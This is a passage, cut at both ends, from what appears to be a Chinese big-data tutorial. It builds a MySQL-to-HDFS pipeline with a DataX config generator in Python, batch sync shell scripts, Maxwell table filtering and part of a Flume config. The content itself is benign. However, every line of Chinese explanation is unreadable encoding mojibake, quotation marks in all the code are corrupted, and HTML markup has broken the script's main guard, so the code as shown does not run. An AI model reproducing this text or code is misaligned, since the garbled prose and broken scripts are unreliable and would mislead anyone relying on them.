â€œend_timeâ€,</p><p>â€œtypeâ€: â€œstringâ€</p><p>},</p><p>{</p><p>â€œnameâ€: â€œcreate_timeâ€,</p><p>â€œtypeâ€: â€œstringâ€</p><p>}</p><p>],</p><p>â€œcompressâ€: â€œgzipâ€,</p><p>â€œdefaultFSâ€: â€œhdfs://hadoop102:8020â€,</p><p>â€œfieldDelimiterâ€: â€œ\tâ€,</p><p>â€œfileNameâ€: â€œactivity_infoâ€,</p><p>â€œfileTypeâ€: â€œtextâ€,</p><p>â€œpathâ€: â€œ<strong>${targetdir}</strong>â€œ,</p><p>â€œwriteModeâ€: â€œappendâ€</p><p>}</p><p>}</p><p>}</p><p>],</p><p>â€œsettingâ€: {</p><p>â€œspeedâ€: {</p><p>â€œchannelâ€: 1</p><p>}</p><p>}</p><p>}</p><p>}</p><p>æ³¨ï¼šç”±äºç›®æ ‡è·¯å¾„åŒ…å«ä¸€å±‚æ—¥æœŸï¼Œç”¨äºå¯¹ä¸åŒå¤©çš„æ•°æ®åŠ ä»¥åŒºåˆ†ï¼Œæ•…pathå‚æ•°å¹¶æœªå†™æ­»ï¼Œéœ€åœ¨æäº¤ä»»åŠ¡æ—¶é€šè¿‡å‚æ•°åŠ¨æ€ä¼ å…¥ï¼Œå‚æ•°åç§°ä¸º<strong>targetdir</strong>ã€‚</p><h4 id="DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬"><a href="#DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬" class="headerlink" title="DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬"></a>DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬</h4><p>æ–¹ä¾¿èµ·è§ï¼Œæ­¤å¤„æä¾›äº†DataXé…ç½®æ–‡ä»¶æ‰¹é‡ç”Ÿæˆè„šæœ¬ï¼Œè„šæœ¬å†…å®¹åŠä½¿ç”¨æ–¹å¼å¦‚ä¸‹ã€‚</p><p><strong>1ï¼‰åœ¨~/binç›®å½•ä¸‹åˆ›å»ºgen_import_config.pyè„šæœ¬</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_import_config.py</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p><p>## coding=utf-8</p><p>import json</p><p>import getopt</p><p>import os</p><p>import sys</p><p>import MySQLdb</p><p>##MySQLç›¸å…³é…ç½®ï¼Œéœ€æ ¹æ®å®é™…æƒ…å†µä½œå‡ºä¿®æ”¹</p><p>mysql_host = â€œhadoop102â€</p><p>mysql_port = â€œ3306â€</p><p>mysql_user = â€œrootâ€</p><p>mysql_passwd = â€œ123456â€</p><p>##HDFS NameNodeç›¸å…³é…ç½®ï¼Œéœ€æ ¹æ®å®é™…æƒ…å†µä½œå‡ºä¿®æ”¹</p><p>hdfs_nn_host = â€œhadoop102â€</p><p>hdfs_nn_port = â€œ8020â€</p><p>##ç”Ÿæˆé…ç½®æ–‡ä»¶çš„ç›®æ ‡è·¯å¾„ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µä½œå‡ºä¿®æ”¹</p><p>output_path = â€œ/opt/module/datax/job/importâ€</p><p>##è·å–mysqlè¿æ¥</p><p>def get_connection():</p><p>return MySQLdb.connect(host=mysql_host, port=int(mysql_port), user=mysql_user,<br>passwd=mysql_passwd)</p><p>##è·å–è¡¨æ ¼çš„å…ƒæ•°æ® åŒ…å«åˆ—åå’Œæ•°æ®ç±»å‹</p><p>def get_mysql_meta(database, table):</p><p>connection = get_connection()</p><p>cursor = connection.cursor()</p><p>sql = â€œSELECT COLUMN_NAME,DATA_TYPE from information_schema.COLUMNS WHERE<br>TABLE_SCHEMA=%s AND TABLE_NAME=%s ORDER BY ORDINAL_POSITIONâ€</p><p>cursor.execute(sql, [database, table])</p><p>fetchall = cursor.fetchall()</p><p>cursor.close()</p><p>connection.close()</p><p>return fetchall</p><p>##è·å–mysqlè¡¨çš„åˆ—å</p><p>def get_mysql_columns(database, table):</p><p>return map(lambda x: x[0], get_mysql_meta(database, table))</p><p>##å°†è·å–çš„å…ƒæ•°æ®ä¸­mysqlçš„æ•°æ®ç±»å‹è½¬æ¢ä¸ºhiveçš„æ•°æ®ç±»å‹ å†™å…¥åˆ°hdfswriterä¸­</p><p>def get_hive_columns(database, table):</p><p>def type_mapping(mysql_type):</p><p>mappings = {</p><p>â€œbigintâ€: â€œbigintâ€,</p><p>â€œintâ€: â€œbigintâ€,</p><p>â€œsmallintâ€: â€œbigintâ€,</p><p>â€œtinyintâ€: â€œbigintâ€,</p><p>â€œdecimalâ€: â€œstringâ€,</p><p>â€œdoubleâ€: â€œdoubleâ€,</p><p>â€œfloatâ€: â€œfloatâ€,</p><p>â€œbinaryâ€: â€œstringâ€,</p><p>â€œcharâ€: â€œstringâ€,</p><p>â€œvarcharâ€: â€œstringâ€,</p><p>â€œdatetimeâ€: â€œstringâ€,</p><p>â€œtimeâ€: â€œstringâ€,</p><p>â€œtimestampâ€: â€œstringâ€,</p><p>â€œdateâ€: â€œstringâ€,</p><p>â€œtextâ€: â€œstringâ€</p><p>}</p><p>return mappings[mysql_type]</p><p>meta = get_mysql_meta(database, table)</p><p>return map(lambda x: {â€œnameâ€: x[0], â€œtypeâ€: type_mapping(x[1].lower())}, meta)</p><p>##ç”Ÿæˆjsonæ–‡ä»¶</p><p>def generate_json(source_database, source_table):</p><p>job = {</p><p>â€œjobâ€: {</p><p>â€œsettingâ€: {</p><p>â€œspeedâ€: {</p><p>â€œchannelâ€: 3</p><p>},</p><p>â€œerrorLimitâ€: {</p><p>â€œrecordâ€: 0,</p><p>â€œpercentageâ€: 0.02</p><p>}</p><p>},</p><p>â€œcontentâ€: [{</p><p>â€œreaderâ€: {</p><p>â€œnameâ€: â€œmysqlreaderâ€,</p><p>â€œparameterâ€: {</p><p>â€œusernameâ€: mysql_user,</p><p>â€œpasswordâ€: mysql_passwd,</p><p>â€œcolumnâ€: get_mysql_columns(source_database, source_table),</p><p>â€œsplitPkâ€: â€œâ€,</p><p>â€œconnectionâ€: [{</p><p>â€œtableâ€: [source_table],</p><p>â€œjdbcUrlâ€: [â€œjdbc:mysql://â€œ + mysql_host + â€œ:â€ + mysql_port + â€œ/â€œ +<br>source_database]</p><p>}]</p><p>}</p><p>},</p><p>â€œwriterâ€: {</p><p>â€œnameâ€: â€œhdfswriterâ€,</p><p>â€œparameterâ€: {</p><p>â€œdefaultFSâ€: â€œhdfs://â€œ + hdfs_nn_host + â€œ:â€ + hdfs_nn_port,</p><p>â€œfileTypeâ€: â€œtextâ€,</p><p>â€œpathâ€: â€œ${targetdir}â€,</p><p>â€œfileNameâ€: source_table,</p><p>â€œcolumnâ€: get_hive_columns(source_database, source_table),</p><p>â€œwriteModeâ€: â€œappendâ€,</p><p>â€œfieldDelimiterâ€: â€œ\tâ€,</p><p>â€œcompressâ€: â€œgzipâ€</p><p>}</p><p>}</p><p>}]</p><p>}</p><p>}</p><p>if not os.path.exists(output_path):</p><p>os.makedirs(output_path)</p><p>with open(os.path.join(output_path, â€œ.â€.join([source_database, source_table,<br>â€œjsonâ€])), â€œwâ€) as f:</p><p>json.dump(job, f)</p><p>def main(args):</p><p>source_database = â€œâ€</p><p>source_table = â€œâ€</p><p>options, arguments = getopt.getopt(args, â€˜-d:-t:â€™, [â€˜sourcedb=â€™, â€˜sourcetbl=â€™])</p><p>for opt_name, opt_value in options:</p><p>if opt_name in (â€˜-dâ€™, â€˜â€“sourcedbâ€™):</p><p>source_database = opt_value</p><p>if opt_name in (â€˜-tâ€™, â€˜â€“sourcetblâ€™):</p><p>source_table = opt_value</p><p>generate_json(source_database, source_table)</p><p>if _<em>name</em>_ == â€˜<strong>main</strong>â€˜:</p><p>main(sys.argv[1:])</p><p><strong>æ³¨ï¼š</strong></p><p><strong>ï¼ˆ1ï¼‰å®‰è£…Python Mysqlé©±åŠ¨</strong></p><p><strong>ç”±äºéœ€è¦ä½¿ç”¨Pythonè®¿é—®Mysqlæ•°æ®åº“ï¼Œæ•…éœ€å®‰è£…é©±åŠ¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</strong></p><p>[atguigu@hadoop102 bin]$ sudo yum install -y MySQL-python</p><p><strong>ï¼ˆ2ï¼‰è„šæœ¬ä½¿ç”¨è¯´æ˜</strong></p><p>python gen_import_config.py <strong>-d</strong> database <strong>-t</strong> table</p><p>é€šè¿‡-dä¼ å…¥æ•°æ®åº“åï¼Œ-tä¼ å…¥è¡¨åï¼Œæ‰§è¡Œä¸Šè¿°å‘½ä»¤å³å¯ç”Ÿæˆè¯¥è¡¨çš„DataXåŒæ­¥é…ç½®æ–‡ä»¶ã€‚</p><p><strong>2ï¼‰åœ¨~/binç›®å½•ä¸‹åˆ›å»ºgen_import_config.shè„šæœ¬</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_import_config.sh</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p><p>##!/bin/bash</p><p>python ~/bin/gen_import_config.py -d gmall -t activity_info</p><p>python ~/bin/gen_import_config.py -d gmall -t activity_rule</p><p>python ~/bin/gen_import_config.py -d gmall -t base_category1</p><p>python ~/bin/gen_import_config.py -d gmall -t base_category2</p><p>python ~/bin/gen_import_config.py -d gmall -t base_category3</p><p>python ~/bin/gen_import_config.py -d gmall -t base_dic</p><p>python ~/bin/gen_import_config.py -d gmall -t base_province</p><p>python ~/bin/gen_import_config.py -d gmall -t base_region</p><p>python ~/bin/gen_import_config.py -d gmall -t base_trademark</p><p>python ~/bin/gen_import_config.py -d gmall -t cart_info</p><p>python ~/bin/gen_import_config.py -d gmall -t coupon_info</p><p>python ~/bin/gen_import_config.py -d gmall -t sku_attr_value</p><p>python ~/bin/gen_import_config.py -d gmall -t sku_info</p><p>python ~/bin/gen_import_config.py -d gmall -t sku_sale_attr_value</p><p>python ~/bin/gen_import_config.py -d gmall -t spu_info</p><p><strong>3ï¼‰ä¸ºgen_import_config.shè„šæœ¬å¢åŠ æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/gen_import_config.sh</p><p><strong>4ï¼‰æ‰§è¡Œgen_import_config.shè„šæœ¬ï¼Œç”Ÿæˆé…ç½®æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 bin]$ gen_import_config.sh</p><p><strong>5ï¼‰è§‚å¯Ÿç”Ÿæˆçš„é…ç½®æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 bin]$ ll /opt/module/datax/job/import/</p><p>æ€»ç”¨é‡ 60</p><p>-rw-rw-râ€“ 1 atguigu atguigu 957 10æœˆ 15 22:17 gmall.activity_info.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 1049 10æœˆ 15 22:17 gmall.activity_rule.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 651 10æœˆ 15 22:17 gmall.base_category1.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 711 10æœˆ 15 22:17 gmall.base_category2.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 711 10æœˆ 15 22:17 gmall.base_category3.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 835 10æœˆ 15 22:17 gmall.base_dic.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 865 10æœˆ 15 22:17 gmall.base_province.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 659 10æœˆ 15 22:17 gmall.base_region.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 709 10æœˆ 15 22:17 gmall.base_trademark.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 1301 10æœˆ 15 22:17 gmall.cart_info.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 1545 10æœˆ 15 22:17 gmall.coupon_info.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 867 10æœˆ 15 22:17 gmall.sku_attr_value.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 1121 10æœˆ 15 22:17 gmall.sku_info.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 985 10æœˆ 15 22:17 gmall.sku_sale_attr_value.json</p><p>-rw-rw-râ€“ 1 atguigu atguigu 811 10æœˆ 15 22:17 gmall.spu_info.json</p><h4 id="æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶"><a href="#æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶" class="headerlink" title="æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶"></a>æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶</h4><p>ä»¥activity_infoä¸ºä¾‹ï¼Œæµ‹è¯•ç”¨è„šæœ¬ç”Ÿæˆçš„é…ç½®æ–‡ä»¶æ˜¯å¦å¯ç”¨ã€‚</p><p><strong>1ï¼‰åˆ›å»ºç›®æ ‡è·¯å¾„</strong></p><p>ç”±äºDataXåŒæ­¥ä»»åŠ¡è¦æ±‚ç›®æ ‡è·¯å¾„æå‰å­˜åœ¨ï¼Œæ•…éœ€æ‰‹åŠ¨åˆ›å»ºè·¯å¾„ï¼Œå½“å‰activity_infoè¡¨çš„ç›®æ ‡è·¯å¾„åº”ä¸º/origin_data/gmall/db/activity_info_full/2020-06-14ã€‚</p><p>[atguigu@hadoop102 bin]$ hadoop fs -mkdir<br>/origin_data/gmall/db/activity_info_full/2020-06-14</p><p><strong>2ï¼‰æ‰§è¡ŒDataXåŒæ­¥å‘½ä»¤</strong></p><p>[atguigu@hadoop102 bin]$ python /opt/module/datax/bin/datax.py<br>-pâ€-Dtargetdir=/origin_data/gmall/db/activity_info_full/2020-06-14â€<br>/opt/module/datax/job/import/gmall.activity_info.json</p><p><strong>3ï¼‰è§‚å¯ŸåŒæ­¥ç»“æœ</strong></p><p>è§‚å¯ŸHFDSç›®æ ‡è·¯å¾„æ˜¯å¦å‡ºç°æ•°æ®ã€‚</p><h4 id="å…¨é‡è¡¨æ•°æ®åŒæ­¥è„šæœ¬"><a href="#å…¨é‡è¡¨æ•°æ®åŒæ­¥è„šæœ¬" class="headerlink" title="å…¨é‡è¡¨æ•°æ®åŒæ­¥è„šæœ¬"></a>å…¨é‡è¡¨æ•°æ®åŒæ­¥è„šæœ¬</h4><p>ä¸ºæ–¹ä¾¿ä½¿ç”¨ä»¥åŠåç»­çš„ä»»åŠ¡è°ƒåº¦ï¼Œæ­¤å¤„ç¼–å†™ä¸€ä¸ªå…¨é‡è¡¨æ•°æ®åŒæ­¥è„šæœ¬ã€‚</p><p><strong>1ï¼‰åœ¨~/binç›®å½•åˆ›å»ºmysql_to_hdfs_full.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/mysql_to_hdfs_full.sh</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p><p>##!/bin/bash</p><p>DATAX_HOME=/opt/module/datax</p><p>## å¦‚æœä¼ å…¥æ—¥æœŸåˆ™do_dateç­‰äºä¼ å…¥çš„æ—¥æœŸï¼Œå¦åˆ™ç­‰äºå‰ä¸€å¤©æ—¥æœŸ</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>##å¤„ç†ç›®æ ‡è·¯å¾„ï¼Œæ­¤å¤„çš„å¤„ç†é€»è¾‘æ˜¯ï¼Œå¦‚æœç›®æ ‡è·¯å¾„ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼›è‹¥å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºï¼Œç›®çš„æ˜¯ä¿è¯åŒæ­¥ä»»åŠ¡å¯é‡å¤æ‰§è¡Œ</p><p>handle_targetdir() {</p><p>hadoop fs -test -e $1</p><p>if [[ $? -eq 1 ]]; then</p><p>echo â€œè·¯å¾„$1ä¸å­˜åœ¨ï¼Œæ­£åœ¨åˆ›å»ºâ€¦â€¦â€</p><p>hadoop fs -mkdir -p $1</p><p>else</p><p>echo â€œè·¯å¾„$1å·²ç»å­˜åœ¨â€</p><p>fs_count=$(hadoop fs -count $1)</p><p>content_size=$(echo $fs_count | awk â€˜{print $3}â€™)</p><p>if [[ $content_size -eq 0 ]]; then</p><p>echo â€œè·¯å¾„$1ä¸ºç©ºâ€</p><p>else</p><p>echo â€œè·¯å¾„$1ä¸ä¸ºç©ºï¼Œæ­£åœ¨æ¸…ç©ºâ€¦â€¦â€</p><p>hadoop fs -rm -r -f $1/*</p><p>fi</p><p>fi</p><p>}</p><p>##æ•°æ®åŒæ­¥</p><p>import_data() {</p><p>datax_config=$1</p><p>target_dir=$2</p><p>handle_targetdir $target_dir</p><p>python $DATAX_HOME/bin/datax.py -pâ€-Dtargetdir=$target_dirâ€ $datax_config</p><p>}</p><p>case $1 in</p><p>â€œactivity_infoâ€)</p><p>import_data /opt/module/datax/job/import/gmall.activity_info.json<br>/origin_data/gmall/db/activity_info_full/$do_date</p><p>;;</p><p>â€œactivity_ruleâ€)</p><p>import_data /opt/module/datax/job/import/gmall.activity_rule.json<br>/origin_data/gmall/db/activity_rule_full/$do_date</p><p>;;</p><p>â€œbase_category1â€)</p><p>import_data /opt/module/datax/job/import/gmall.base_category1.json<br>/origin_data/gmall/db/base_category1_full/$do_date</p><p>;;</p><p>â€œbase_category2â€)</p><p>import_data /opt/module/datax/job/import/gmall.base_category2.json<br>/origin_data/gmall/db/base_category2_full/$do_date</p><p>;;</p><p>â€œbase_category3â€)</p><p>import_data /opt/module/datax/job/import/gmall.base_category3.json<br>/origin_data/gmall/db/base_category3_full/$do_date</p><p>;;</p><p>â€œbase_dicâ€)</p><p>import_data /opt/module/datax/job/import/gmall.base_dic.json<br>/origin_data/gmall/db/base_dic_full/$do_date</p><p>;;</p><p>â€œbase_provinceâ€)</p><p>import_data /opt/module/datax/job/import/gmall.base_province.json<br>/origin_data/gmall/db/base_province_full/$do_date</p><p>;;</p><p>â€œbase_regionâ€)</p><p>import_data /opt/module/datax/job/import/gmall.base_region.json<br>/origin_data/gmall/db/base_region_full/$do_date</p><p>;;</p><p>â€œbase_trademarkâ€)</p><p>import_data /opt/module/datax/job/import/gmall.base_trademark.json<br>/origin_data/gmall/db/base_trademark_full/$do_date</p><p>;;</p><p>â€œcart_infoâ€)</p><p>import_data /opt/module/datax/job/import/gmall.cart_info.json<br>/origin_data/gmall/db/cart_info_full/$do_date</p><p>;;</p><p>â€œcoupon_infoâ€)</p><p>import_data /opt/module/datax/job/import/gmall.coupon_info.json<br>/origin_data/gmall/db/coupon_info_full/$do_date</p><p>;;</p><p>â€œsku_attr_valueâ€)</p><p>import_data /opt/module/datax/job/import/gmall.sku_attr_value.json<br>/origin_data/gmall/db/sku_attr_value_full/$do_date</p><p>;;</p><p>â€œsku_infoâ€)</p><p>import_data /opt/module/datax/job/import/gmall.sku_info.json<br>/origin_data/gmall/db/sku_info_full/$do_date</p><p>;;</p><p>â€œsku_sale_attr_valueâ€)</p><p>import_data /opt/module/datax/job/import/gmall.sku_sale_attr_value.json<br>/origin_data/gmall/db/sku_sale_attr_value_full/$do_date</p><p>;;</p><p>â€œspu_infoâ€)</p><p>import_data /opt/module/datax/job/import/gmall.spu_info.json<br>/origin_data/gmall/db/spu_info_full/$do_date</p><p>;;</p><p>â€œallâ€)</p><p>import_data /opt/module/datax/job/import/gmall.activity_info.json<br>/origin_data/gmall/db/activity_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.activity_rule.json<br>/origin_data/gmall/db/activity_rule_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_category1.json<br>/origin_data/gmall/db/base_category1_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_category2.json<br>/origin_data/gmall/db/base_category2_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_category3.json<br>/origin_data/gmall/db/base_category3_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_dic.json<br>/origin_data/gmall/db/base_dic_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_province.json<br>/origin_data/gmall/db/base_province_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_region.json<br>/origin_data/gmall/db/base_region_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_trademark.json<br>/origin_data/gmall/db/base_trademark_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.cart_info.json<br>/origin_data/gmall/db/cart_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.coupon_info.json<br>/origin_data/gmall/db/coupon_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.sku_attr_value.json<br>/origin_data/gmall/db/sku_attr_value_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.sku_info.json<br>/origin_data/gmall/db/sku_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.sku_sale_attr_value.json<br>/origin_data/gmall/db/sku_sale_attr_value_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.spu_info.json<br>/origin_data/gmall/db/spu_info_full/$do_date</p><p>;;</p><p>esac</p><p><strong>2ï¼‰ä¸ºmysql_to_hdfs_full.shå¢åŠ æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/mysql_to_hdfs_full.sh</p><p><strong>3ï¼‰æµ‹è¯•åŒæ­¥è„šæœ¬</strong></p><p>[atguigu@hadoop102 bin]$ mysql_to_hdfs_full.sh all 2020-06-14</p><p><strong>4ï¼‰æ£€æŸ¥åŒæ­¥ç»“æœ</strong></p><p>æŸ¥çœ‹HDFSç›®è¡¨è·¯å¾„æ˜¯å¦å‡ºç°å…¨é‡è¡¨æ•°æ®ï¼Œå…¨é‡è¡¨å…±15å¼ ã€‚</p><h4 id="å…¨é‡è¡¨åŒæ­¥æ€»ç»“"><a href="#å…¨é‡è¡¨åŒæ­¥æ€»ç»“" class="headerlink" title="å…¨é‡è¡¨åŒæ­¥æ€»ç»“"></a>å…¨é‡è¡¨åŒæ­¥æ€»ç»“</h4><p>å…¨é‡è¡¨åŒæ­¥é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œåªéœ€æ¯æ—¥æ‰§è¡Œå…¨é‡è¡¨æ•°æ®åŒæ­¥è„šæœ¬mysql_to_hdfs_full.shå³å¯ã€‚</p><h3 id="å¢é‡è¡¨æ•°æ®åŒæ­¥"><a href="#å¢é‡è¡¨æ•°æ®åŒæ­¥" class="headerlink" title="å¢é‡è¡¨æ•°æ®åŒæ­¥"></a>å¢é‡è¡¨æ•°æ®åŒæ­¥</h3><h4 id="æ•°æ®é€šé“-1"><a href="#æ•°æ®é€šé“-1" class="headerlink" title="æ•°æ®é€šé“"></a>æ•°æ®é€šé“</h4><h4 id="Maxwellé…ç½®"><a href="#Maxwellé…ç½®" class="headerlink" title="Maxwellé…ç½®"></a>Maxwellé…ç½®</h4><p>æŒ‰ç…§è§„åˆ’ï¼Œæœ‰cart_infoã€comment_infoç­‰å…±è®¡13å¼ è¡¨éœ€è¿›è¡Œå¢é‡åŒæ­¥ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒMaxwellä¼šåŒæ­¥binlogä¸­çš„æ‰€æœ‰è¡¨çš„æ•°æ®å˜æ›´è®°å½•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹Maxwellè¿›è¡Œé…ç½®ï¼Œå¦å…¶åªåŒæ­¥è¿™ç‰¹å®šçš„13å¼ è¡¨ã€‚</p><p>å¦å¤–ï¼Œä¸ºæ–¹ä¾¿ä¸‹æ¸¸ä½¿ç”¨æ•°æ®ï¼Œè¿˜éœ€å¯¹Maxwellè¿›è¡Œé…ç½®ï¼Œå¦å…¶å°†ä¸åŒè¡¨çš„æ•°æ®å‘å¾€ä¸åŒçš„Kafka<br>Topicã€‚Maxwellæœ€ç»ˆé…ç½®å¦‚ä¸‹ï¼š</p><p><strong>1ï¼‰ä¿®æ”¹Maxwellé…ç½®æ–‡ä»¶config.properties</strong></p><p>[atguigu@hadoop102 maxwell]$ vim /opt/module/maxwell/config.properties</p><p><strong>2ï¼‰å…¨éƒ¨é…ç½®å‚æ•°å¦‚ä¸‹</strong></p><p>log_level=info</p><p>producer=kafka</p><p>kafka.bootstrap.servers=hadoop102:9092,hadoop103:9092</p><p>##kafka topicåŠ¨æ€é…ç½®</p><p>kafka_topic=%{table}</p><p>## mysql login info</p><p>host=hadoop102</p><p>user=maxwell</p><p>password=maxwell</p><p>jdbc_options=useSSL=false&amp;serverTimezone=Asia/Shanghai</p><p>##è¡¨è¿‡æ»¤ï¼ŒåªåŒæ­¥ç‰¹å®šçš„13å¼ è¡¨</p><p>filter=<br>include:gmall.cart_info,include:gmall.comment_info,include:gmall.coupon_use,include:gmall.favor_info,include:gmall.order_detail,include:gmall.order_detail_activity,include:gmall.order_detail_coupon,include:gmall.order_info,include:gmall.order_refund_info,include:gmall.order_status_log,include:gmall.payment_info,include:gmall.refund_payment,include:gmall.user_info</p><p><strong>3ï¼‰é‡æ–°å¯åŠ¨Maxwell</strong></p><p>[atguigu@hadoop102 bin]$ mxw.sh restart</p><p><strong>4ï¼‰é€šé“æµ‹è¯•</strong></p><p><strong>ï¼ˆ1ï¼‰å¯åŠ¨Zookeeperä»¥åŠKafkaé›†ç¾¤</strong></p><p><strong>ï¼ˆ2ï¼‰å¯åŠ¨ä¸€ä¸ªKafka Console Consumerï¼Œæ¶ˆè´¹ä»»ä¸€topicæ•°æ®</strong></p><p>[atguigu@hadoop103 kafka]$ bin/kafka-console-consumer.sh â€“bootstrap-server<br>hadoop102:9092 â€“topic <strong>cart_info</strong></p><p><strong>ï¼ˆ3ï¼‰ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®</strong></p><p>[atguigu@hadoop102 bin]$ cd /opt/module/db_log/</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p><strong>ï¼ˆ4ï¼‰è§‚å¯ŸKafkaæ¶ˆè´¹è€…æ˜¯å¦èƒ½æ¶ˆè´¹åˆ°æ•°æ®</strong></p><p>{â€œdatabaseâ€:â€gmallâ€,â€tableâ€:â€<strong>cart_info</strong>â€œ,â€typeâ€:â€updateâ€,â€tsâ€:1592270938,â€xidâ€:13090,â€xoffsetâ€:1573,â€dataâ€:{â€œidâ€:100924,â€user_idâ€:â€93â€,â€sku_idâ€:16,â€cart_priceâ€:4488.00,â€sku_numâ€:1,â€img_urlâ€:â€<a href="http://47.93.148.192:8080/group1/M00/00/02/rBHu8l-sklaALrngAAHGDqdpFtU741.jpg&quot;,&quot;sku_name&quot;:&quot;%E5%8D%8E%E4%B8%BA">http://47.93.148.192:8080/group1/M00/00/02/rBHu8l-sklaALrngAAHGDqdpFtU741.jpg&quot;,&quot;sku_name&quot;:&quot;åä¸º</a><br>HUAWEI P40 éº’éºŸ990 5G SoCèŠ¯ç‰‡ 5000ä¸‡è¶…æ„ŸçŸ¥å¾•å¡ä¸‰æ‘„ 30å€æ•°å­—å˜ç„¦<br>8GB+128GBäº®é»‘è‰²å…¨ç½‘é€š5Gæ‰‹æœºâ€,â€is_checkedâ€:null,â€create_timeâ€:â€2020-06-14<br>09:28:57â€,â€operate_timeâ€:null,â€is_orderedâ€:1,â€order_timeâ€:â€2021-10-17<br>09:28:58â€,â€source_typeâ€:â€2401â€,â€source_idâ€:null},â€oldâ€:{â€œis_orderedâ€:0,â€order_timeâ€:null}}</p><h4 id="Flumeé…ç½®"><a href="#Flumeé…ç½®" class="headerlink" title="Flumeé…ç½®"></a>Flumeé…ç½®</h4><p><strong>1ï¼‰Flumeé…ç½®æ¦‚è¿°</strong></p><p>Flumeéœ€è¦å°†Kafkaä¸­å„topicçš„æ•°æ®ä¼ è¾“åˆ°HDFSï¼Œæ•…å…¶éœ€é€‰ç”¨KafkaSourceä»¥åŠHDFSSinkï¼ŒChanneé€‰ç”¨FileChanneã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒKafkaSourceéœ€è®¢é˜…Kafkaä¸­çš„13ä¸ªtopicï¼ŒHDFSSinkéœ€è¦å°†ä¸åŒtopicçš„æ•°æ®å†™åˆ°ä¸åŒçš„è·¯å¾„ï¼Œå¹¶ä¸”è·¯å¾„ä¸­åº”å½“åŒ…å«ä¸€å±‚æ—¥æœŸï¼Œç”¨äºåŒºåˆ†æ¯å¤©çš„æ•°æ®ã€‚å…³é”®é…ç½®å¦‚ä¸‹ï¼š</p><p>å…·ä½“æ•°æ®ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p><strong>2ï¼‰Flumeé…ç½®å®æ“</strong></p><p><strong>ï¼ˆ1ï¼‰åˆ›å»ºFlumeé…ç½®æ–‡ä»¶</strong></p><p>åœ¨hadoop104èŠ‚ç‚¹çš„Flumeçš„jobç›®å½•ä¸‹åˆ›å»ºkafka_to_hdfs_db.conf</p><p>[atguigu@hadoop104 flume]$ mkdir job</p><p>[atguigu@hadoop104 flume]$ vim job/kafka_to_hdfs_db.conf</p><p><strong>ï¼ˆ2ï¼‰é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹</strong></p><p>a1.sources = r1</p><p>a1.channels = c1</p><p>a1.sinks = k1</p><p>a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource</p><p>a1.sources.r1.batchSize = 5000</p><p>a1.sources.r1.batchDurationMillis = 2000</p><p>a1.sources.r1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092</p><p>a1.sources.r1.kafka.topics =<br>cart_info,comment_info,coupon_use,favor_info,order_detail_activity,order_detail_coupon,order_detail,order_info,order_refund_info,order_status_log,payment_info,refund_payment,user_info</p><p>a1.sources.r1.kafka.consumer.group.id = flume</p><p>a1.sources.r1.setTopicHeader = 